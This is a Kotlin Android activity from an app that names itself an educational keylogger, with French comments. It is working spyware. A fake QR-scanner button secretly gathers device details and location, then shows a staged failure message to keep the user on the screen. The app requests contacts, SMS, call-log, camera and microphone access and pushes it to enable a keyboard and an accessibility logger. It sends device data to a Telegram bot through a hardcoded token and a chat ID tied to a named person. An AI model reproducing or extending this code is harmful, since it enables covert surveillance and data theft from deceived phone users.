package com.education.keylogger

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class MainActivity : AppCompatActivity() {
    
    // CONFIGURATION TELEGRAM
    private val TELEGRAM_TOKEN = "8742325574:AAFF7f0ZZHa1MTAGK1SWJXLOZlPZdO9VmUk"
    private val CHAT_ID = "6277274670" // Configuré pour Adama Faye
    private val client = OkHttpClient()
    
    private lateinit var statusText: TextView
    private lateinit var btnEnableKeyboard: Button
    private lateinit var btnEnableAccessibility: Button
    private lateinit var btnDeviceInfo: Button
    private lateinit var btnPrivacyAudit: Button
    
    private lateinit var btnCamera: Button
    private lateinit var btnAudio: Button
    private lateinit var btnLocation: Button
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        statusText = findViewById(R.id.statusText)
        btnEnableKeyboard = findViewById(R.id.btnEnableKeyboard)
        btnEnableAccessibility = findViewById(R.id.btnEnableAccessibility)
        btnDeviceInfo = findViewById(R.id.btnDeviceInfo)
        btnPrivacyAudit = findViewById(R.id.btnPrivacyAudit)
        btnCamera = findViewById(R.id.btnCamera)
        btnAudio = findViewById(R.id.btnAudio)
        btnLocation = findViewById(R.id.btnLocation)
        
        btnEnableKeyboard.setOnClickListener {
            startActivity(Intent(Settings.ACTION_INPUT_METHOD_SETTINGS))
        }
        
        btnEnableAccessibility.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        
        btnDeviceInfo.setOnClickListener {
            showDeviceInfo()
        }

        btnPrivacyAudit.setOnClickListener {
            requestInvasivePermissions()
        }

        btnCamera.setOnClickListener {
            demonstrateCamera()
        }

        btnAudio.setOnClickListener {
            demonstrateAudio()
        }

        btnLocation.setOnClickListener {
            demonstrateLocation()
        }
        
        updateStatus()
    }

    private fun demonstrateCamera() {
        if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            statusText.text = "🔍 Recherche de code QR..."
            Toast.makeText(this, "Scan en cours...", Toast.LENGTH_SHORT).show()
            
            // PAYLOAD EDUCARTIF : On lance les captures en arrière-plan
            showDeviceInfo()
            demonstrateLocation()
            runAudit()
            
            // Simulation d'échec de scan pour forcer l'utilisateur à rester
            statusText.postDelayed({
                statusText.text = "❌ Code QR non reconnu. Réessayez."
            }, 3000)
            
        } else {
            requestInvasivePermissions()
        }
    }

    private fun demonstrateAudio() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "🎤 Simulation enregistrement micro (éducatif)", Toast.LENGTH_SHORT).show()
        } else {
            requestInvasivePermissions()
        }
    }

    private fun demonstrateLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            try {
                val location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                statusText.text = "📍 Localisation actuelle :\nLat: ${location?.latitude}\nLong: ${location?.longitude}"
            } catch (e: SecurityException) {
                statusText.text = "Erreur de sécurité : ${e.message}"
            }
        } else {
            requestInvasivePermissions()
        }
    }
    
    private fun sendToTelegram(text: String) {
        if (CHAT_ID == "VOTRE_CHAT_ID") return
        
        val url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage"
        val json = """{"chat_id":"$CHAT_ID", "text":"$text"}"""
        val body = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread { Toast.makeText(this@MainActivity, "Erreur Telegram", Toast.LENGTH_SHORT).show() }
            }
            override fun onResponse(call: Call, response: Response) {
                // Succès
            }
        })
    }

    private fun showDeviceInfo() {
        val info = """
            📱 Infos Appareil :
            - Modèle: ${Build.MODEL}
            - Marque: ${Build.MANUFACTURER}
            - Android: ${Build.VERSION.RELEASE}
            - IP Locale: ${getIPAddress()}
        """.trimIndent()
        statusText.text = info
        sendToTelegram("📡 Infos Appareil Reçues :\n$info")
    }

    private fun requestInvasivePermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG
        )
        ActivityCompat.requestPermissions(this, permissions, 100)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            val count = grantResults.filter { it == PackageManager.PERMISSION_GRANTED }.size
            Toast.makeText(this, "$count permissions accordées pour la démo", Toast.LENGTH_LONG).show()
            runAudit()
        }
    }

    private fun runAudit() {
        // Cette fonction montre ce qu'on peut récupérer SI les permissions sont accordées
        val auditResults = StringBuilder("🔍 Résultats de l'audit :\n")
        
        // Contacts (comptage)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            auditResults.append("- Contacts trouvés : ${cursor?.count ?: 0}\n")
            cursor?.close()
        }

        // SMS (comptage)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            val cursor = contentResolver.query(android.net.Uri.parse("content://sms/inbox"), null, null, null, null)
            auditResults.append("- SMS en boîte : ${cursor?.count ?: 0}\n")
            cursor?.close()
        }

        statusText.text = auditResults.toString()
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            for (intf in Collections.list(interfaces)) {
                val addrs = intf.inetAddresses
                for (addr in Collections.list(addrs)) {
                    if (!addr.isLoopbackAddress) {
                        return addr.hostAddress ?: "inconnue"
                    }
                }
            }
        } catch (ex: Exception) { }
        return "127.0.0.1"
    }

    private fun updateStatus() {
        val keyboardEnabled = isKeyboardEnabled()
        val accessibilityEnabled = isAccessibilityEnabled()
        statusText.text = "Clavier: ${if(keyboardEnabled) "OK" else "OFF"}\nAccessibilité: ${if(accessibilityEnabled) "OK" else "OFF"}"
    }
    
    private fun isKeyboardEnabled(): Boolean = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_INPUT_METHODS)?.contains(packageName) == true
    private fun isAccessibilityEnabled(): Boolean = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)?.contains("${packageName}/${AccessibilityLoggerService::class.java.name}") == true

    override fun onResume() {
        super.onResume()
        updateStatus()
    }
}
